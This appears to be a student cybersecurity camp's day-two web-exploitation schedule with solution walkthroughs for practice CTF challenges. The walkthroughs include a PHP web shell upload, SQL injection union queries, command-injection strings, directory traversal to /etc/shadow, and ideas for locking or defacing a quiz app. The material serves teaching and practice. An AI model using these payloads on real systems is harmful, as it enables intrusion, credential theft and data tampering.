# Day 2 Schedule: Web Exploitation

| Day | Time                  | Title                                               |   Instructor |
|-----|-----------------------|-----------------------------------------------------|--------------|
| 2   | 09:00-09:15           | Arrival                                             |              |
| 2   | 09:15-09:55           | Web Application Security & OWASP Top 10  |    TJ    |
| 2   | 09:55-10:25           | Web Challeges on spacadets.ctfd.io | |
| 2   | 10:25-10:40           | Snack | |
| 2   | 10:40-11:20           | Man-in-the-middle attacks |    TJ   |
| 2   | 11:20-11:50           | MITM Challenges on spacecadets.ctfd.io | |
| 2   | 11:50-12:50           | Lunch | |
| 2   | 12:50-13:30           | File Based Attacks|   TJ     |
| 2   | 13:30-14:00           | Upload Challenges | |
| 2   | 14:00-14:40           | Injection Based Attacks|   TJ    |
| 2   | 14:40-15:10           | Injection Challenges | |
| 2   | 15:10-15:40           | Think Like an Adversary Activity: Hack This Quiz Activity     |      |
| 2   | 15:40-16:00           | Journaling | |

# References
- [OWASP Prevention Cheat Sheets](https://cheatsheetseries.owasp.org/index.html)
- [OWASP Web Parameter Tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering)
- [OWASP Unrestricted File Uploads](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
 - [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
 - [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

 ## web: man-in-the-middle

**Discovery-1:** change the ``visits`` cookie to 1,000,0000 to bypass the check at https://spacecadets-discovery-1.chals.io

**Discovery-2:** while there is a check in place to prevent negative betting, it is only performed client-side by javascript. You can bypass it by just modifying the URL parameters ``https://spacecadets-discovery-2.chals.io/?guess=1337&bet=-31337`` and youll see ``Congrats! Here is your flag: flag{moon_landing}``

## web: file-uploads

**Discovery-3:** You can upload a malicious php script that can see the flag. Something like the following.

```php
<?php
$output = shell_exec('cat flag.txt');
echo "<pre>$output</pre>";
?>
```

**Discovery-4:** The problem suffers a local file inclusion via directory traversal. You can navigate to /flag.txt by going to ``https://spacecadets-discovery-4.chals.io/?quote=../../../flag`` to see the flag.

Then fetch the contents from the server, which will trigger executing the php script. Browing ``https://spacecadets-discovery-3.chals.io/trash/tmpnq4orunt.php`` we see the flag ``flag{june_18_1983}``

## web: injection

**Discovery-5:** The first step is discovering the table named that holds the flag. You can do this by querying ``1' union SELECT name FROM sqlite_master WHERE type='table'; --`` which will generate a query that displays the tables including ``locations secrets``. Next, I need to determine the columns in this table so I can do ``32937' union SELECT name FROM pragma_table_info('secrets') --`` which will show that there is a column named ``flags``. Finally I can construct a query to show the flag using ``32937' union select flags from secrets --``

**Discovery-6:** The flag is located in the root directory. You can inject ``ls; cat/ flag.txt`` to display the contents of the flag. 

# Activity: Think Like an Adversary: Hack this Quiz

Potential solutions

**Start with the robots**: ``/robots.txt`` shows some interesting results, including /admin, /submit_scores, /source, /submit_quiz.

**/admin**: automatic win, we can delete users off the score board with this hidden page

**/source**: gives us the source of the web application so we can further investigate it. of particular note, it suffers a local file inclusion vulnerability where ``/source?filename=../etc/shadow`` can arbitrary read files from the entire machine

Examining the source code, we see something interesting with ``/submit_scores``. We can just throw a GET with the right parameters and arbitrarily insert data into the database 

```python
@app.route('/submit_scores')
def submit_scores():
    username = request.args.get('username')
    score = request.args.get('score')
    if (username and score):
        try:
            db = get_db()
            cursor = db.cursor()
            cursor.execute("INSERT INTO scores (username, score) VALUES (?, ?)", (username, score))
            db.commit()
```

So a query like ``submit_scores?username=max&score=100`` will put ``max`` into the database with a score of 100. Yeah!

**/**: there is a command injection bug on the default page. We can discover it by testing some input with special characters like ``",-,'``. Submitting ``bob')"; ls -al; echo "`` will execute the ``ls -al`` command and get the output. We can use this do do things like lock the database chmod 444 quiz.db so that nobody can insert into it. Or we can rewrite the template/scores.html to a static page. Lots of options here

**/quiz** has some interesting quirks. Notably the random number is stored as a cookie, so we can look it up. 
